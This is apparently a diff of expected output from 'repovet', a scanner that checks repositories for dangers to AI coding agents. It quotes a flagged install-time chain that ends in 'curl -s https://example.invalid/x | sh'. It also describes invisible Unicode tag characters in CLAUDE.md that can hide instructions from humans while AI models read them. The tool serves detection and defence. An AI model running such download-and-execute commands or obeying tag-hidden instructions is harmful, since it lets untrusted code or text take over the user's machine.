@@ -2,24 +2,35 @@ repovet 0.1.0 · local folder D:\src\demo · offline · 1,284 files · 3 rules
 Lines starting with '>' are untrusted content quoted from the repository.
 
 ┌─ SUMMARY ───────────────────────────────────────────────────────────────────┐
-│ 1 critical · 2 high · 1 medium · 1 low · 0 info                             │
+│ Do not let an AI coding agent work in it until you have read the findings   │
+│ below.                                                                      │
+│                                                                             │
+│ 1 critical · 3 high · 0 medium · 1 low · 2 info                             │
 │                                                                             │
 │ Look at these first                                                         │
 │ 1. CRITICAL  RC-AGENT-002  CLAUDE.md:3                                      │
 │    Title                                                                    │
-│ 2. HIGH      RC-AGENT-020  2 places                                         │
+│ 2. HIGH      RC-AUTO-090   package.json:3                                   │
 │    Title                                                                    │
-│ 3. MEDIUM    RC-AUTO-001   package.json:3                                   │
+│ 3. HIGH      RC-AGENT-020  2 places                                         │
 │    Title                                                                    │
 └─────────────────────────────────────────────────────────────────────────────┘
 
-DANGER                                   1 critical · 2 high · 1 medium
+DANGER                                   1 critical · 3 high · 2 info
   CRITICAL  RC-AGENT-002  CLAUDE.md:3                           confidence high
             2 invisible tag characters hide this text: "Hi"
             > Hello<U+E0048><U+E0069> <U+001B>[31m
             Why  Unicode tag characters are invisible in editors and on GitHub,
                  but AI models read them as text and may follow hidden
                  instructions in them.
+            Do   Read it first.
+
+  HIGH      RC-AUTO-090   package.json:3                        confidence high
+            npm install script runs on install and reaches download-and-execute
+            (RC-DLX-001) after 3 steps: package.json -> x.js -> x.sh
+            Path chain-1: package.json:3 -> x.js -> x.sh:2
+            > curl -s https://example.invalid/x | sh
+            Why  Because tools run this automatically.
             Do   Read it first.
 
   HIGH      RC-AGENT-020  2 places                            confidence medium
@@ -31,14 +42,21 @@ DANGER                                   1 critical · 2 high · 1 medium
             Why  Because tools run this automatically.
             Do   Read it first.
 
-  MEDIUM    RC-AUTO-001   package.json:3                        confidence high
+  MEDIUM    RC-AUTO-001   package.json:3 (part of chain-1)      confidence high
             package.json defines a 'postinstall' script: node x.js
+
+  MEDIUM    RC-DLX-001    x.sh:2 (part of chain-1)              confidence high
+            Downloads and runs code in one step: curl -s
+            https://example.invalid/x | sh
+            > curl -s https://example.invalid/x | sh
+
+  INFO      RC-AGENT-001  2 places: AI agent file present
 
 TRUST                                    1 low
   LOW       RC-TRUST-001  (repository)                          confidence high
             Something was found.
 
-Why/Do for medium, low and info findings and all places: --details
+Why/Do for medium, low and info findings, all places and info details: --details
 
 PROVENANCE PROFILE                       facts, not findings
   Files      1,284 files, 12.3 MB; 1,100 text files with 98,765 lines, 184
